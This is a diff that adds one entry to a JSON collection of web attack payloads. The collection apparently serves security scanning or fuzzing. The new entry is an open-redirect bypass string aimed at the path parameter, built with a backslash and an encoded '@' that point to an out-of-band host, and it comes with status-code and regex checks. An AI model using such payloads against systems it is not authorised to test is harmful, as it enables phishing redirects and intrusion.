@@ -1637,5 +1637,16 @@
       "expected_status_code": 302,
       "success_regex": "^https?://"
     }
+  },
+  {
+    "payload_id": "OWP-474652",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/\\example.com%40oast.me",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
   }
 ]
